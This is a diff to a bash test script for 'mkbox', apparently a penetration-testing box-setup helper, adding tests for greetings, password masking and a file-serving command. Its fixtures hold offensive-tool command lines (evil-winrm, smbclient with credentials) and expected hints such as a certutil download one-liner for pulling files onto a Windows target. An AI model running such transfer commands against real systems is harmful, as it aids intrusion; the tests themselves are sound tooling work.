@@ -44,7 +44,7 @@ echo "$*" >> "${CHOWN_LOG:-/dev/null}"
 exec "$(PATH="${PATH#*:}" command -v chown)" "$@"
 STUB
 # serve backends: record the arguments instead of starting a server
-for tool in impacket-smbserver wsgidav; do
+for tool in impacket-smbserver wsgidav python3; do
   # shellcheck disable=SC2016  # the stub script must expand $* and ${SERVE_LOG} when it runs, not now
   printf '#!/usr/bin/env bash\necho "%s $*" >> "${SERVE_LOG:-/dev/null}"\n' "$tool" > "$T/bin/$tool"
 done
@@ -62,12 +62,14 @@ echo "basics"
 check "--version prints mkbox X.Y.Z"     bash -c "'$MK' --version | grep -Eq '^mkbox [0-9]+\.[0-9]+\.[0-9]+\$'"
 "$MK" -n smoke 10.10.10.9 > "$T/n1.out" 2>&1
 check "-n creates the box"               has "$T/n1.out" "Created"
+check "-n on a new box says Happy Hacking" has "$T/n1.out" "Happy Hacking :)"
 check "box layout exists"                test -d smoke/nmap -a -d smoke/screenshots -a -f smoke/notes/notes.md
 check ".gitignore is just *"             test "$(cat smoke/.gitignore)" = '*'
 check "new box dir is private (700)"     mode smoke 700
 check "box.env remembers the IP"         has smoke/box.env "10.10.10.9"
 "$MK" -n smoke > "$T/n2.out" 2>&1
 check "-n on an existing box says so"    has "$T/n2.out" "already exists"
+check "existing box: no greeting"        bash -c "! grep -q 'Happy Hacking' '$T/n2.out'"
 check "bad box name rejected"            bash -c "! '$MK' -n 'bad name' 2>/dev/null"
 check "IP starting with - rejected"      bash -c "! '$MK' -n other -sV 2>/dev/null"
 check "-l lists the box"                 bash -c "'$MK' -l | grep -q '^smoke .*10.10.10.9'"
@@ -113,6 +115,8 @@ now="$(date +%s)"
   echo "#$((now + 2))"; echo "xfreerdp /v:10.10.10.9 /u:admin /p:Passw0rd! /cert:ignore"
   echo "#$((now + 3))"; echo "smbclient //10.10.10.9/share -U 'admin%Passw0rd!'"
   echo "#$((now + 4))"; echo "evil-winrm -i 10.10.10.9 -u admin -p 'Passw0rd!'"
+  echo "#$((now + 5))"; echo "serve --smb --share loot --auth bob:Sm8Secret"
+  echo "#$((now + 6))"; echo "serve --smb --auth='carl:Qu0tedPw'"
 } >> smoke/.bash_history_smoke
 "$MK" -r smoke > "$T/r1.out" 2>&1
 R=smoke/report/smoke-report.md
@@ -129,7 +133,9 @@ check "timeline: mysql -pPASS masked"    has "$R" "mysql -u root -p*** -h 10.10.
 check "timeline: xfreerdp /p: masked"    has "$R" "/p:*** /cert:ignore"
 check "timeline: smbclient -U masked"    has "$R" "-U 'admin%***'"
 check "timeline: evil-winrm -p masked"   has "$R" "evil-winrm -i 10.10.10.9 -u admin -p ***"
-check "no real password left in report"  bash -c "! grep -qE 'Secret123|Passw0rd|Sup3rSecret|Hunter2pw' '$R'"
+check "timeline: serve --auth masked"    has "$R" "serve --smb --share loot --auth bob:***"
+check "timeline: serve --auth= quoted masked" has "$R" "serve --smb --auth='carl:***'"
+check "no real password left in report"  bash -c "! grep -qE 'Secret123|Passw0rd|Sup3rSecret|Hunter2pw|Sm8Secret|Qu0tedPw' '$R'"
 "$MK" -r --creds smoke > /dev/null 2>&1
 check "--creds puts creds/ in the tarball" bash -c "tar -tzf smoke/report/smoke-evidence.tar.gz | grep -q '^creds/creds.txt'"
 echo "bob's password is Hunter2pw (oops)" >> smoke/notes/notes.md
@@ -158,12 +164,25 @@ echo "serve backends"
 printf '%s\n' 'serve --smb --share loot --bind 10.10.14.2 4455' \
   'serve --smb --auth bob:pw1234' \
   'serve --webdav --bind 10.10.14.2 8080' \
+  'serve --webdav --auth a:b' \
+  'serve --http 8000' \
   'serve --smb --share "bad share"' \
   'exit' | "$MK" smoke > "$T/serve.out" 2>&1
 check "smb: share, port, bind passed"    has "$SERVE_LOG" "-smb2support -port 4455 -ip 10.10.14.2 loot $PWD/smoke/transfer"
 check "smb: default port 445 + auth"     has "$SERVE_LOG" "-port 445 -username bob -password pw1234 share"
 check "webdav: host/port/root passed"    has "$SERVE_LOG" "wsgidav --host 10.10.14.2 --port 8080 --root $PWD/smoke/transfer --auth anonymous"
 check "smb: bad share name rejected"     has "$T/serve.out" "--share must be"
+check "serve timeline: smb start note"   has smoke/notes/timeline.md "serve: smb started (port 4455, bind 10.10.14.2, share loot)"
+check "serve timeline: webdav start note" has smoke/notes/timeline.md "serve: webdav started (port 8080, bind 10.10.14.2)"
+check "serve timeline: user, no password" has smoke/notes/timeline.md "serve: smb started (port 445, share share, user bob)"
+check "serve timeline: password not logged" lacks smoke/notes/timeline.md "pw1234"
+check "serve timeline: end note"         has smoke/notes/timeline.md "serve: smb ended (exit 0"
+check "hint: smb copy line"              has "$T/serve.out" 'copy \\10.10.14.2\loot\FILE .'
+check "hint: smb net use with user"      has "$T/serve.out" 'net use \\<your-ip>\share /user:bob <password>'
+check "hint: webdav DavWWWRoot + port"   has "$T/serve.out" 'copy \\10.10.14.2@8080\DavWWWRoot\FILE .'
+check "http: python http.server, port"   has "$SERVE_LOG" "python3 -m http.server 8000"
+check "hint: http wget/certutil"         has "$T/serve.out" "certutil -urlcache -split -f http://<your-ip>:8000/FILE FILE"
+check "serve --auth needs --smb"         has "$T/serve.out" "--auth is only supported with --smb"
 
 # --- re-entering vs typos -----------------------------------------------------------------------
 echo "new vs existing"
@@ -172,6 +191,8 @@ printf 'exit\n' | "$MK" smok > "$T/e2.out" 2>&1
 check "existing box: re-entering"        has "$T/e1.out" "re-entering 'smoke'"
 check "typo: says creating new box"      has "$T/e2.out" "creating new box 'smok'"
 check "typo: hints about setip"          has "$T/e2.out" "setip"
+check "new box via shell: Happy Hacking" has "$T/e2.out" "Happy Hacking :)"
+check "re-entering: no greeting"         bash -c "! grep -q 'Happy Hacking' '$T/e1.out'"
 
 echo
 echo "$PASS passed, $FAIL failed"
